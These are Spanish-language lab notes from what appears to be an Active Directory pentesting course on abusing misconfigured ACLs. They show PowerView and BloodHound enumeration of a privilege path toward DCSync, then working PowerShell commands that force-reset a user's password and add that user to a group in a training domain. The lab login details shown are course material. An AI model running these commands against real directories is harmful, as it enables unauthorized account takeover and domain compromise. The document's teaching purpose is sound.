> Por razones de seguridad, no todos los usuarios y equipos en un entorno AD pueden acceder a todos los objetos y archivos. Estos permisos se gestionan mediante Listas de Control de Acceso (ACL). Una pequeña mala configuración en una ACL puede filtrar permisos hacia objetos que no los necesitan, lo que supone una seria amenaza para la postura de seguridad del dominio.

### Descripción general de ACL

Las ACL son listas que indican quién (“security principal”) y con qué nivel de acceso (ACE) puede interactuar con un objeto. Hay dos tipos:

- **DACL**: controla permisos explícitos. Si falta, concede todo; si está vacía, niega todo.    
- **SACL**: registra en log los intentos de acceso.    

Cada ACE dentro de la DACL vincula un usuario, grupo o proceso a un permiso concreto (p. ej. Control total, Cambiar contraseña).

##### Visualización de la ACL de forend

> _$forend$ es un usuario_

![[forend_ACL.png]]

Los SACLs pueden verse en la pestaña `Auditing`:

![[forend_SACL.png]]

### Access Control Entries (ACEs)

| ACE                    | Descripción                                                                                                       |
|------------------------|-------------------------------------------------------------------------------------------------------------------|
| Access denied ACE      | Entrada en la DACL que deniega explícitamente el acceso a un usuario o grupo a un objeto.                         |
| Access allowed ACE     | Entrada en la DACL que otorga explícitamente el acceso a un usuario o grupo a un objeto.                         |
| System audit ACE       | Entrada en la SACL que genera registros de auditoría cuando un usuario o grupo intenta acceder a un objeto, anotando si se permitió o denegó el acceso y el tipo de acceso realizado. |

Cada ACE consta de estos cuatro componentes:

1. **Identificador de seguridad (SID)** del usuario/grupo que tiene acceso al objeto (o nombre del principal, según se muestre gráficamente).    
2. **Tipo de ACE**, que indica si es de denegación de acceso (access denied), concesión de acceso (access allowed) o auditoría de sistema (system audit).    
3. **Flags de herencia**, que especifican si los contenedores u objetos hijos pueden heredar esta entrada ACE del objeto principal o padre.    
4. **Access mask**, un valor de 32 bits que define los derechos concretos concedidos sobre el objeto.

Podemos verlo de forma gráfica en **Usuarios y Equipos de Active Directory (ADUC)**. En la imagen de ejemplo siguiente, podemos observar lo siguiente para la entrada ACE del usuario **forend**:

![[aces_forend.png]]

- El principal de seguridad es **Angela Dunn** (`adunn@inlanefreight.local`).    
- El tipo de ACE es **Permitir**.    
- La herencia se aplica a “Este objeto y todos los objetos descendientes”, es decir, cualquier objeto hijo de **forend** heredará estos mismos permisos.    
- Los derechos concedidos al objeto se muestran gráficamente en el ejemplo (p. ej. Control total, Lectura, etc.).    

Cuando el sistema evalúa una lista de control de acceso, recorre las entradas de arriba abajo y detiene la comprobación en cuanto encuentra una ACE de **Denegar**.

##### ¿Por qué los ACEs son importantes?

Los atacantes aprovechan las entradas ACE para ampliar su acceso o establecer persistencia. Esto es muy útil para nosotros como pentesters, ya que muchas organizaciones desconocen qué ACEs se han aplicado a cada objeto o el impacto que pueden tener si se configuran incorrectamente. Estas configuraciones no pueden detectarse con herramientas de escaneo de vulnerabilidades y a menudo permanecen sin revisarse durante años, especialmente en entornos grandes y complejos. En una auditoría en la que el cliente ya ha corregido los “low hanging fruit” de AD, el abuso de ACLs puede ser una vía excelente para moverse lateral o verticalmente e incluso lograr la compromi­sión total del dominio. Algunos ejemplos de permisos de seguridad sobre objetos de Active Directory son:

- **ForceChangePassword**: abusado con `Set-DomainUserPassword`    
- **Add Members**: abusado con `Add-DomainGroupMember`    
- **GenericAll**: abusado con `Set-DomainUserPassword` o `Add-DomainGroupMember
- **GenericWrite**: abusado con `Set-DomainObject`    
- **WriteOwner**: abusado con `Set-DomainObjectOwner`    
- **WriteDACL**: abusado con `Add-DomainObjectACL`    
- **AllExtendedRights**: abusado con `Set-DomainUserPassword` o `Add-DomainGroupMember`    
- **AddSelf**: abusado con `Add-DomainGroupMember`    

Estas relaciones pueden enumerarse (y visualizarse) con herramientas como BloodHound y explotarse con PowerView, entre otras. En este módulo veremos cómo aprovechar cuatro ACEs clave para ataques sobre ACL:

- **ForceChangePassword**: permite restablecer la contraseña de un usuario sin conocerla previamente (útil, pero debe pactarse con el cliente).    
- **GenericWrite**: autoriza a modificar atributos no protegidos:    
    - Sobre usuarios, podemos asignarles un SPN para Kerberoasting.        
    - Sobre grupos, añadirnos a ellos.        
    - Sobre equipos, habilitar Resource-Based Constrained Delegation.        
- **AddSelf**: permite a un usuario añadirse a determinados grupos de seguridad.    
- **GenericAll**: otorga control total sobre el objeto:    
    - En usuarios o grupos, cambiar contraseñas, modificar membresías y Kerberoasting dirigido.        
    - En equipos, leer contraseñas LAPS si está en uso, obteniendo administrador local.        

Más adelante profundizaremos en cada uno de estos ataques, tanto desde Windows como desde Linux.

![[Grafico.png]]

En AD encontraremos continuamente ACEs y privilegios nuevos; nuestra forma de detectarlos (con BloodHound, PowerView o herramientas nativas) debe ser suficientemente flexible para adaptarnos. Por ejemplo, podríamos ver que tenemos permiso `ReadGMSAPassword` sobre un gMSA y usar herramientas como GMSAPasswordReader para extraer esa contraseña. O hallar derechos extendidos como `Unexpire-Password` o `Reanimate-Tombstones` y buscar la manera de explotarlos. Familiarizarse con todas las aristas de BloodHound y los derechos extendidos de AD es clave, pues nunca sabes cuál podrás necesitar en una auditoría.

Podemos aprovechar ataques sobre ACL para moverse lateralmente, escalar privilegios o mantener persistencia. Los escenarios más comunes son:

- **Abusar de permisos de restablecer contraseñas**: si tomamos control de cuentas con derecho a “olvidé mi contraseña” (Help Desk, IT), podemos resetear la de cuentas más privilegiadas.    
- **Abusar de la gestión de membresías de grupo**: con permisos para añadir/quitar usuarios de grupos, podemos incluirnos en uno privilegiado.    
- **Derechos excesivos heredados o accidentales**: instalaciones de software (p. ej. Exchange) o configuraciones antiguas pueden dejar ACLs que conceden permisos inesperados a usuarios o equipos.    

> **Nota:** Algunas de estas acciones son “destructivas” (cambiar contraseñas, modificar objetos). Si tienes dudas, consulta siempre al cliente y documenta cada cambio para revertirlo y dejar evidencia en el informe.

### Enumerando ACLs con PowerView

Podemos usar PowerView para enumerar ACLs, pero la tarea de buscar entre _todos_ los resultados será extremadamente lenta y seguramente imprecisa. Por ejemplo, si ejecutamos la función `Find-InterestingDomainAcl` recibiremos una cantidad masiva de información sobre la que tendremos que buscar detalladamente para que tenga algo de sentido:

##### Usando `Find-InterestingDomainAcl`

```powershell-session
PS C:\htb> Find-InterestingDomainAcl
...SNIP...
```

Si intentamos revisar todos estos datos durante una auditoría con tiempo limitado, probablemente no lleguemos a nada interesante antes de que termine. Sin embargo, existe una forma de usar herramientas como PowerView de manera más eficaz: realizar una enumeración dirigida empezando por un usuario sobre el que ya tengamos control. Centrémonos en el usuario **wley**, cuya cuenta obtuvimos tras resolver la última cuestión en la sección “LLMNR/NBT-NS Poisoning – desde Linux”. Profundicemos y veamos si este usuario tiene algún permiso ACL interesante que podamos explotar. Primero necesitamos obtener el SID de nuestro usuario objetivo para buscar de forma efectiva.

```powershell-session
PS C:\htb> Import-Module .\PowerView.ps1
PS C:\htb> $sid = Convert-NameToSid wley
```

A continuación podemos usar la función `Get-DomainObjectACL` para realizar nuestra búsqueda dirigida. En el ejemplo siguiente, empleamos esta función para encontrar todos los objetos del dominio sobre los que nuestro usuario tiene permisos, asignando el SID del usuario (almacenado en la variable `$sid`) a la propiedad `SecurityIdentifier`, que indica quién posee cada permiso sobre un objeto.

Un punto a tener en cuenta: si ejecutamos la búsqueda sin el parámetro `-ResolveGUIDs`, obtendremos resultados como el que se muestra más abajo, donde el permiso `ExtendedRight` no nos aclara qué entrada ACE concreta tiene **wley** sobre **damundsen**. Esto ocurre porque la propiedad `ObjectAceType` devuelve un valor GUID que no es legible por humanos.

> **Aviso:** Este comando puede tardar bastante en ejecutarse, especialmente en entornos grandes. En nuestro laboratorio, puede tardar entre 1 y 2 minutos en completarse.

##### Usando Get-DomainObjectACL

```powershell-session
PS C:\htb> Get-DomainObjectACL -Identity * | ? {$_.SecurityIdentifier -eq $sid}
```

Podríamos buscar en Google el GUID **00299570-246d-11d0-a768-00aa006e0529** y dar con una página que indica que el usuario tiene el derecho de forzar el cambio de contraseña de otro usuario. Alternativamente, podríamos hacer una búsqueda inversa con PowerShell para mapear el nombre del permiso de vuelta al valor GUID.

> Si PowerView ya ha sido importado, el cmdlet mostrado debajo resultará en error. Por tanto, puede que necesitemos ejecutarlo desde una nueva sesión de PowerShell.

##### Realizando una búsqueda inversa y mapeando a un valor GUID

```powershell-session
PS C:\htb> $guid= "00299570-246d-11d0-a768-00aa006e0529"
PS C:\htb> Get-ADObject -SearchBase "CN=Extended-Rights,$((Get-ADRootDSE).ConfigurationNamingContext)" -Filter {ObjectClass -like 'ControlAccessRight'} -Properties * |Select Name,DisplayName,DistinguishedName,rightsGuid| ?{$_.rightsGuid -eq $guid} | fl

Name              : User-Force-Change-Password
DisplayName       : Reset Password
DistinguishedName : CN=User-Force-Change-Password,CN=Extended-Rights,CN=Configuration,DC=INLANEFREIGHT,DC=LOCAL
rightsGuid        : 00299570-246d-11d0-a768-00aa006e0529
```

Esto nos dio nuestra respuesta, pero sería muy ineficiente durante una auditoría PowerView cuenta con el flag `ResolveGUIDs`, que hace esto por nosotros. Fíjemonos en cómo el output cambia cuando incluimos este flag para mostrar el formato legible de la propiedad `ObjectAceType` como `User-Force-Change-Password`.

##### Usando el flag `-ResolveGUIDs`

```powershell-session
PS C:\htb> Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid} 
```

> ¿Por qué recorrimos este ejemplo cuando podríamos haber buscado usando `-ResolveGUIDs` desde el principio?

Es fundamental comprender qué hacen nuestras herramientas y disponer de métodos alternativos en nuestra caja de herramientas por si una herramienta falla o queda bloqueada. Antes de continuar, veamos rápidamente cómo podríamos hacer esto usando los cmdlets `Get-Acl` y `Get-ADUser`, que quizá estén disponibles en un sistema del cliente. Saber realizar este tipo de búsquedas sin depender de herramientas como PowerView es muy valioso y puede marcar la diferencia frente a otros profesionales. Podríamos usar este conocimiento para obtener resultados cuando el cliente nos limite a los comandos ya presentes en su sistema y no podamos cargar nuestras propias utilidades.

Este ejemplo no es muy eficiente y el comando puede tardar mucho en ejecutarse, especialmente en entornos grandes. Llevará mucho más tiempo que el comando equivalente con PowerView. En este comando, primero hemos generado una lista de todos los usuarios del dominio con el siguiente comando:

##### Creando una lista de usuarios de dominio

```powershell-session
PS C:\htb> Get-ADUser -Filter * | Select-Object -ExpandProperty SamAccountName > ad_users.txt
```

A continuación leemos cada línea del fichero con un bucle `foreach` y para cada usuario:

1. Ejecutamos `Get-ADUser` pasándole el nombre de usuario (desde cada línea de `ad_users.txt`).    
2. Con `Get-Acl` obtenemos la información de ACL de ese objeto usuario.    
3. Seleccionamos únicamente la propiedad `Access`, que contiene los derechos de acceso.    
4. Filtramos por la propiedad `IdentityReference` estableciéndola en el usuario bajo nuestro control (en este caso, **wley**) para ver a qué objetos tiene permisos.

```powershell-session
PS C:\htb> foreach($line in [System.IO.File]::ReadLines("C:\Users\htb-student\Desktop\ad_users.txt")) {get-acl  "AD:\$(Get-ADUser $line)" | Select-Object Path -ExpandProperty Access | Where-Object {$_.IdentityReference -match 'INLANEFREIGHT\\wley'}}

Path                  : Microsoft.ActiveDirectory.Management.dll\ActiveDirectory:://RootDSE/CN=Dana 
                        Amundsen,OU=DevOps,OU=IT,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
ActiveDirectoryRights : ExtendedRight
InheritanceType       : All
ObjectType            : 00299570-246d-11d0-a768-00aa006e0529
InheritedObjectType   : 00000000-0000-0000-0000-000000000000
ObjectFlags           : ObjectAceTypePresent
AccessControlType     : Allow
IdentityReference     : INLANEFREIGHT\wley
IsInherited           : False
InheritanceFlags      : ContainerInherit
PropagationFlags      : None
```

Una vez dispongamos de estos datos, podríamos seguir los métodos mostrados más arriba para convertir el GUID a un formato legible y entender qué permisos tenemos sobre el usuario objetivo.

En resumen, partimos del usuario **wley** y ahora tenemos control sobre la cuenta **damundsen** gracias al derecho extendido **User-Force-Change-Password**. Usemos Powerview para buscar hacia dónde —si es que en algún sitio— nos puede llevar el control de la cuenta **damundsen**.

##### Enumeración exhaustiva sobre los privilegios usando damundsen

```powershell-session
PS C:\htb> $sid2 = Convert-NameToSid damundsen
PS C:\htb> Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid2} -Verbose
```

Nuestro usuario **damundsen** tiene **GenericWrite** sobre el grupo **Help Desk Level 1**, lo que le permite añadirse (o añadir a otros) y heredar sus permisos. Además, ese grupo está anidado dentro de **Information Technology**, por lo que al ponernos en **Help Desk Level 1** automáticamente obtenemos todos los derechos que concede **Information Technology**.

##### Investigando el grupo Help Desk Level 1 con Get-DomainGroup

```powershell-session
PS C:\htb> Get-DomainGroup -Identity "Help Desk Level 1" | select memberof

memberof                                                                      
--------                                                                      
CN=Information Technology,OU=Security Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
```

En resumen:

- Con la contraseña de **wley** (recuperada y crackeada) hemos visto que su ACL le permite forzar el cambio de contraseña de **damundsen**.    
- **Damundsen** a su vez tiene **GenericWrite** sobre **Help Desk Level 1**, así que puede añadirse a ese grupo.    
- **Help Desk Level 1** está anidado en **Information Technology**, así que al entrar en el primero heredamos todos los derechos del segundo.    
- Miembros de **Information Technology** poseen **GenericAll** sobre **adunn**, lo que nos permitirá modificar membresías, forzar cambios de contraseña o lanzar un Kerberoasting dirigido sobre **adunn**.

##### Investigando el grupo Information Technology

```powershell-session
PS C:\htb> $itgroupsid = Convert-NameToSid "Information Technology"
PS C:\htb> Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $itgroupsid} -Verbose
```

> Finalmente, veamos si el usuario `adunn` tiene algún tipo de acceso interesante que podamos aprovechar para acercarnos a nuestro objetivo

##### Buscando acceso interesante

```powershell-session
PS C:\htb> $adunnsid = Convert-NameToSid adunn 
PS C:\htb> Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $adunnsid} -Verbose

AceQualifier           : AccessAllowed
ObjectDN               : DC=INLANEFREIGHT,DC=LOCAL
ActiveDirectoryRights  : ExtendedRight
ObjectAceType          : DS-Replication-Get-Changes-In-Filtered-Set
ObjectSID              : S-1-5-21-3842939050-3880317879-2865463114
InheritanceFlags       : ContainerInherit
BinaryLength           : 56
AceType                : AccessAllowedObject
ObjectAceFlags         : ObjectAceTypePresent
IsCallback             : False
PropagationFlags       : None
SecurityIdentifier     : S-1-5-21-3842939050-3880317879-2865463114-1164
AccessMask             : 256
AuditFlags             : None
IsInherited            : False
AceFlags               : ContainerInherit
InheritedObjectAceType : All
OpaqueLength           : 0

AceQualifier           : AccessAllowed
ObjectDN               : DC=INLANEFREIGHT,DC=LOCAL
ActiveDirectoryRights  : ExtendedRight
ObjectAceType          : DS-Replication-Get-Changes
ObjectSID              : S-1-5-21-3842939050-3880317879-2865463114
InheritanceFlags       : ContainerInherit
BinaryLength           : 56
AceType                : AccessAllowedObject
ObjectAceFlags         : ObjectAceTypePresent
IsCallback             : False
PropagationFlags       : None
SecurityIdentifier     : S-1-5-21-3842939050-3880317879-2865463114-1164
AccessMask             : 256
AuditFlags             : None
IsInherited            : False
AceFlags               : ContainerInherit
InheritedObjectAceType : All
OpaqueLength           : 0

<SNIP>
```

La salida muestra que el usuario **adunn** tiene los derechos **DS-Replication-Get-Changes** y **DS-Replication-Get-Changes-In-Filtered-Set** sobre el objeto de dominio. Esto significa que podemos usarlo para realizar un ataque DCSync. Cubriremos este ataque en detalle en la sección de DCSync.

### Enumerando ACLs con BloodHound

Ahora que hemos enumerado la ruta de ataque usando métodos más manuales como PowerView y cmdlets nativos de PowerShell, veamos lo mucho más sencillo que habría sido identificarla con la potente herramienta BloodHound. Tomemos los datos que recopilamos antes con el ingestor SharpHound y súbelos a BloodHound. A continuación, podemos establecer al usuario **wley** como nuestro nodo de partida, seleccionar la pestaña **Node Info** y desplazarnos hasta **Outbound Control Rights**. Esta opción nos mostrará los objetos sobre los que tenemos control directo, a través de la pertenencia a grupos, y el número de objetos que nuestro usuario podría llegar a controlar mediante rutas de ataque ACL en **Transitive Object Control**. Si hacemos clic en el “1” junto a **First Degree Object Control**, veremos el primer conjunto de permisos que enumeramos: **ForceChangePassword** sobre el usuario **damundsen**.

##### Viendo información de nodo a través de BloodHound

![[acls_bloodhound1.png]]

Al hacer clic derecho sobre la línea que une los dos nodos, se abre un menú contextual. Si seleccionas **Help**, BloodHound te mostrará:
- Detalles sobre ese permiso concreto (ACE) y ejemplos de herramientas y comandos para explotarlo.    
- Consideraciones de seguridad operacional (OpSec).    
- Referencias externas para profundizar.   

Más adelante exploraremos a fondo este menú y cómo sacarle todo el partido.

##### Investigando ForceChangePassword más

![[acls_bloodhound2.png]]
Si hacemos click en el `16` al lado de `Transitive Object Control`, veremos la ruta completa que enumeramos dolorosamente arriba. Desde aquí, podríamos aprovechar los menús de ayuda por cada arista para encontrar formas de acontecer cada ataque

##### Viendo rutas potenciales de ataque a través de BloodHound

![[acls_bloodhound3.png]]
Finalmente, podemos usar `pre-build queries` en BloodHound para confirmar que el usuario `adunn` tiene privilegios DCSync

##### Viendo Pre-Build queries a través de BloodHound

![[acls_Bloodhound4.png]]
Hemos enumerado estas rutas de ataque en múltiples formas. El siguiente paso será realizar esta cadena de ataque desde el principio hasta el final. Ahora, contestemos las preguntas de la academia.

##### _What is the rights GUID for User-Force-Change-Password?_

> **Respuesta:** 00299570-246d-11d0-a768-00aa006e0529

Lo primero es conectarnos por RDP:

```bash
rdesktop -u htb-student \
         -p 'Academy_student_AD!' \
         -d INLANEFREIGHT.LOCAL \
         10.129.175.187
```

En este momento, navegamos a la ruta `C:\Tools` e importamos el módulo de PowerView:

```powershell
Import-Module .\PowerView.ps1 
```

Ahora creamos el `$sid` con la siguiente línea:

```powershell
$sid = Convert-NameToSid wley
```

> → Usa PowerView para convertir el **nombre de usuario** `wley` en su correspondiente **SID (Security Identifier)**.

```powershell
Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid}
```

- `Get-DomainObjectACL -ResolveGUIDs -Identity *`  
    → Lista los **ACLs (listas de control de acceso)** de todos los objetos del dominio, resolviendo los GUIDs por nombres legibles.    
- `| ? {$_.SecurityIdentifier -eq $sid}`  
    → Filtra solo los objetos cuyos permisos están asignados al **SID** obtenido antes (usuario `wley`).

![[powerview_sid1.png]]

Si queremos ver el GUID:

```powershell
$sid = Convert-NameToSid wley
Get-DomainObjectACL -Identity * | ? {$_.SecurityIdentifier -eq $sid}
```

| Entry        | Value                               |
|--------------|-------------------------------------|
| CN           | User-Force-Change-Password          |
| Display-Name | Reset Password                      |
| Rights-GUID  | 00299570-246d-11d0-a768-00aa006e0529 |
##### _What flag can we use with PowerView to show us the ObjectAceType in a human-readable format during our enumeration?_

> **Respuesta:** ResolveGUIDs

La opción `-ResolveGUIDs` de PowerView se utiliza porque muchos permisos en Active Directory (como los `ExtendedRights` o los `ObjectAceType`) se almacenan internamente como **GUIDs**. Estos identificadores globales únicos son difíciles de interpretar si no se traducen.

##### _What privileges does the user damundsen have over the Help Desk Level 1 group?_

> **Respuesta:** GenericWrite

```powershell
$sid2 = Convert-NameToSid damundsen
Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid2} -Verbose
```

Primero, con `$sid2 = Convert-NameToSid damundsen`, obtienes el **SID** del usuario `damundsen`.

Después, ejecutas `Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid2}`, lo que significa que estás buscando **todos los objetos del dominio sobre los que `damundsen` tiene permisos explícitos**, y los filtras para que solo aparezcan aquellos en los que su **SID esté mencionado en las ACLs**.

El objetivo aquí probablemente sea **ver si `damundsen` tiene control sobre otros objetos**, por ejemplo, si puede cambiar contraseñas, replicar el AD, o tiene control total sobre usuarios o grupos. El flag `-ResolveGUIDs` se usa otra vez para que esos permisos se muestren en texto legible y no como GUIDs.

![[privileges.png]]

##### _Using the skills learned in this section, enumerate the ActiveDirectoryRights that the user forend has over the user dpayne (Dagmar Payne)_

> **Respuesta:** GenericAll

```powershell
$sid2 = Convert-NameToSid forend
Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid2}
```

![[Pasted image 20250721115755.png]]

El propósito aquí es comprobar **qué control tiene `forend` dentro del dominio**, es decir, si tiene permisos especiales sobre otros usuarios, grupos, OU o incluso sobre objetos críticos del dominio. Esto es clave para detectar posibles **delegaciones de control mal configuradas**, útiles para escalada de privilegios.

##### _What is the ObjectAceType of the first right that the forend user has over the GPO Management group? (two words in the format Word-Word)_

> **Respuesta:** Self-Membership

Lo primero es ejecutar SharpHound:

```powershell
.\SharpHound.exe -c All --zipfilename ILFREIGHT
```

Este paso recopila toda la información relevante del entorno Active Directory para posteriormente analizarla en la interfaz de **BloodHound** y buscar relaciones de privilegios, rutas de ataque, delegaciones, etc. Después, subimos el archivo ZIP a BloodHound GUI para el análisis.

Seleccionamos FOREND@INLANEFREIGHT.LOCAL como nodo de comienzo. Después, desde la pestaña `Node Info`, navegamos hasta la sección `Outbound Control Rights`, seguida de `First Degree Object Control`

![[Pasted image 20250721120555.png]]

## Tácticas de abuso en ACL

Una vez más, para recapitular dónde estamos y hacia dónde queremos llegar: tenemos control sobre el usuario `wley`, cuya **hash NTLMv2** obtuvimos previamente ejecutando **Responder** durante la fase inicial de la auditoría. Tuvimos suerte, ya que este usuario usaba una contraseña débil, y pudimos **crackear la hash offline con Hashcat** y recuperar el valor en texto claro.

Sabemos que podemos usar este acceso para iniciar una cadena de ataque que nos permitirá tomar el control del usuario `adunn`, quien **tiene permisos para realizar un ataque DCSync**. Esto nos daría control total sobre el dominio, permitiéndonos obtener los hashes NTLM de todas las cuentas del dominio, escalar privilegios a **Domain Admin / Enterprise Admin** e incluso establecer **persistencia**.

Para ejecutar esta cadena de ataque, debemos hacer lo siguiente:

1. Usar el usuario `wley` para **cambiar la contraseña** del usuario `damundsen`.
2. Autenticarnos como `damundsen` y aprovechar los **permisos GenericWrite** para añadir un usuario bajo nuestro control al grupo **Help Desk Level 1**.
3. Aprovechar la **membresía en grupos anidados** del grupo **Information Technology** y los **permisos GenericAll** para tomar el control del usuario `adunn`.

Por tanto, lo primero es autenticarnos como `wley` y forzar el cambio de contraseña del usuario `damundsen`. Podemos empezar abriendo una consola de PowerShell y autenticándonos como el usuario `wley`, a menos que ya estemos ejecutando la sesión bajo esa identidad. Para ello, podemos crear un objeto `PSCredential`.

##### Creando un objeto PSCredential

```powershell
PS C:\htb> $SecPassword = ConvertTo-SecureString '<PASSWORD HERE>' -AsPlainText -Force
PS C:\htb> $Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\wley', $SecPassword)
```

Después, debemos crear un [SecureString object](https://docs.microsoft.com/en-us/dotnet/api/system.security.securestring?view=net-6.0)  que representa la contraseña que queremos usar para el usuario objetivo `damundsen`. 

##### Creando un objeto SecureString

```powershell
PS C:\htb> $damundsenPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force
```

Finalmente, usaremos la función `Set-DomainUserPassword` de PowerView para cambiar la contraseña del usuario. Es necesario usar el parámetro `-Credential` junto con el objeto de credenciales que creamos para el usuario `wley`. Es recomendable añadir siempre el flag `-Verbose` para obtener retroalimentación sobre si el comando se ejecutó correctamente o para ver el mayor nivel de detalle posible en caso de error. También podríamos hacer esto desde una máquina atacante Linux utilizando una herramienta como `pth-net`, que forma parte del conjunto de herramientas **pth-toolkit**.

##### Cambiando la contraseña del usuario

```powershell
PS C:\htb> cd C:\Tools\
PS C:\htb> Import-Module .\PowerView.ps1
PS C:\htb> Set-DomainUserPassword -Identity damundsen -AccountPassword $damundsenPassword -Credential $Cred -Verbose

VERBOSE: [Get-PrincipalContext] Using alternate credentials
VERBOSE: [Set-DomainUserPassword] Attempting to set the password for user 'damundsen'
VERBOSE: [Set-DomainUserPassword] Password for user 'damundsen' successfully reset
```

Podemos ver que el comando se ejecutó correctamente, cambiando la contraseña del usuario objetivo utilizando las credenciales que especificamos para el usuario `wley`, sobre el cual tenemos control. A continuación, necesitamos llevar a cabo un proceso similar para **autenticarnos como el usuario `damundsen`** y **añadirnos al grupo Help Desk Level 1**.

##### Creando un SecureString Object usando damundsen

```powershell
PS C:\htb> $SecPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force
PS C:\htb> $Cred2 = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\damundsen', $SecPassword) 
```

Después, podemos usar la función [Add-DomainGroupMember](https://powersploit.readthedocs.io/en/latest/Recon/Add-DomainGroupMember/) para añadirnos a nosotros mismos en el grupo objetivo. Podemos primero confirmar que nuestro usuario no es un miembro del grupo objetivo. Esto también se podría hacer desde Linux usando `pth-toolkit`.

##### Añadiendo damundsen al grupo Help Desk Level 1

```powershell
PS C:\htb> Get-ADGroup -Identity "Help Desk Level 1" -Properties * | Select -ExpandProperty Members

CN=Stella Blagg,OU=Operations,OU=Logistics-LAX,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
CN=Marie Wright,OU=Operations,OU=Logistics-LAX,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
...SNIP...
```

```powershell
PS C:\htb> Add-DomainGroupMember -Identity 'Help Desk Level 1' -Members 'damundsen' -Credential $Cred2 -Verbose

VERBOSE: [Get-PrincipalContext] Using alternate credentials
VERBOSE: [Add-DomainGroupMember] Adding member 'damundsen' to group 'Help Desk Level 1'
```

##### Confirmando que damundsen ha sido añadido al grupo

```powershell
PS C:\htb> Get-DomainGroupMember -Identity "Help Desk Level 1" | Select MemberName

MemberName
----------
busucher
spergazed

<SNIP>

damundsen
dpayne
```
